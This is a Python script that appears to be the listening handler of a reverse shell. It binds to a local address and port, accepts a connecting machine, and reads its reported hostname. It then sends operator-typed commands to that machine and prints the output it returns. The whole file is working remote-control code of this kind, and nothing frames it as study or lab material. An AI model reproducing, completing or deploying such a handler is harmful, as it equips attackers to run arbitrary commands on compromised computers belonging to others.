import socket
import sys
import time

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_ip = '192.168.1.70'
server_port = 8080

identifier = '<END_OF_COMMAND_OUTPUT>'

try:
    server_address = (server_ip, server_port)
    server_socket.bind(server_address)

    server_socket.listen(5)

    print(f'[{time.asctime()}] Listening for incoming client(s) on {server_ip}:{server_port}...') #ADD TIMESTAMP
    server_socket, client_address = server_socket.accept()
except Exception as e:
    print(f'[{time.asctime()}] Error. {e}') #ADD TIMESTAMP
    sys.exit()
except KeyboardInterrupt:
    sys.exit()
else:
    client_info = server_socket.recv(1024).decode()
    client_hostname = client_info[client_info.index('Hostname:') + len('Hostname:'):client_info.index('Version')].strip()

    print(f'[{time.asctime()}] Connection with {client_address} was succesfully established.\n{client_info}') #ADD TIMESTAMP

try:
    while True:
        command = input(f'{client_address} : {client_hostname} > ') 
        server_socket.send(command.encode())

        if command.upper() == 'WQ':
            server_socket.close()
            print('Socket closed.')
            break
        elif command == '':
            continue
        elif command.startswith('cd'):
            server_socket.send(command.encode())
            continue
        else:
            full_command_output = b''
            while True:
                chunk = server_socket.recv(1024)
                if chunk.endswith(identifier.encode()):
                    chunk = chunk[:-len(identifier)]
                    full_command_output += chunk
                    break
                full_command_output += chunk
            print(full_command_output.decode())
            
except Exception as e:
    print(f'[{time.asctime()}] Error occured. {e}\nSocket was closed.') #ADD TIMESTAMP
    server_socket.close()
except KeyboardInterrupt:
    server_socket.close()
    sys.exit('Exit')
